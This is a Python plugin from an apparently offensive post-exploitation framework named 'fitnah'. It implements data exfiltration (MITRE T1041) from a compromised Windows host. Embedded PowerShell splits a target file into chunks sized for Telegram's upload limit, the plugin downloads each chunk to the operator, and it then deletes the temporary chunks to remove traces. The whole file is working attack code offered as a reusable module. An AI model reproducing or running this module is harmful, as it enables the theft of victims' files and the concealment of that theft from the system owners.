"""exfiltration/chunked_send — split large file into chunks and send each via ctx.download(). MITRE T1041"""
import os
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre

_CHUNK_BYTES_DEFAULT = 49 * 1024 * 1024  # 49 MB = Telegram file limit


class ChunkedSend(BasePlugin):
    NAME        = "chunked_send"
    DESCRIPTION = "Split large file into chunks on target, download each chunk, then cleanup."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1041"
    CATEGORY    = "exfiltration"
    schema      = ParamSchema().add(
        Param("path",     str, required=True,  help="Full path to file on target"),
        Param("chunk_mb", int, required=False, default=49,
              help="Chunk size in MB (max 49 for Telegram; default 49)"),
        Param("cleanup",  bool, required=False, default=True,
              help="Delete chunk files from target after download"),
    )

    @mitre("T1041")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        path     = params["path"]
        chunk_mb = min(params.get("chunk_mb", 49), 49)
        cleanup  = params.get("cleanup", True)
        chunk_bytes = chunk_mb * 1024 * 1024

        # Split file on target using PS
        split_ps = (
            f"$src = '{path}';"
            f"$chunkSize = {chunk_bytes};"
            "$base = [System.IO.Path]::GetFileNameWithoutExtension($src);"
            "$dir  = [System.IO.Path]::GetDirectoryName($src);"
            "$tmpDir = \"$env:TEMP\\chunks_$(Get-Random)\";"
            "New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null;"
            "$fs = [System.IO.File]::OpenRead($src);"
            "$buf = New-Object byte[] $chunkSize;"
            "$i = 0; $parts = @();"
            "while (($read = $fs.Read($buf, 0, $chunkSize)) -gt 0) {"
            "  $chunkPath = \"$tmpDir\\$base.part$i\";"
            "  $cf = [System.IO.File]::OpenWrite($chunkPath);"
            "  $cf.Write($buf, 0, $read); $cf.Close();"
            "  $parts += $chunkPath;"
            "  $i++"
            "};"
            "$fs.Close();"
            "$totalSize = (Get-Item $src).Length;"
            "Write-Output \"CHUNKS:$($parts.Count):$([Math]::Round($totalSize/1MB,2))MB\";"
            "$parts | ForEach-Object { Write-Output $_ }"
        )
        r = ctx.ps(split_ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])

        lines = [l.strip() for l in r["output"].strip().splitlines() if l.strip()]
        if not lines:
            return ModuleResult.err("No output from split operation")

        header = lines[0]  # CHUNKS:N:XMB
        chunk_paths = lines[1:]

        if not chunk_paths:
            return ModuleResult.err(f"No chunk paths returned. Header: {header}")

        downloaded = []
        errors     = []
        for cp in chunk_paths:
            dl = ctx.download(cp)
            if dl["status"] != "ok":
                errors.append(f"Failed: {cp} — {dl.get('output', '?')}")
            else:
                downloaded.append(cp)
            if cleanup:
                ctx.ps(f"Remove-Item '{cp}' -Force -EA SilentlyContinue")

        if cleanup and chunk_paths:
            # Remove the temp chunk dir
            chunk_dir = chunk_paths[0].rsplit("\\", 1)[0] if "\\" in chunk_paths[0] else ""
            if chunk_dir:
                ctx.ps(f"Remove-Item '{chunk_dir}' -Recurse -Force -EA SilentlyContinue")

        summary = (
            f"[+] {header}\n"
            f"    Downloaded: {len(downloaded)}/{len(chunk_paths)} chunks\n"
        )
        if errors:
            summary += "\n".join(f"    [-] {e}" for e in errors)

        ok = len(downloaded) == len(chunk_paths)
        if ok:
            return ModuleResult.ok(data=summary, loot_kind="file")
        return ModuleResult.ok(data=summary + "\n[!] Partial download", loot_kind="file")
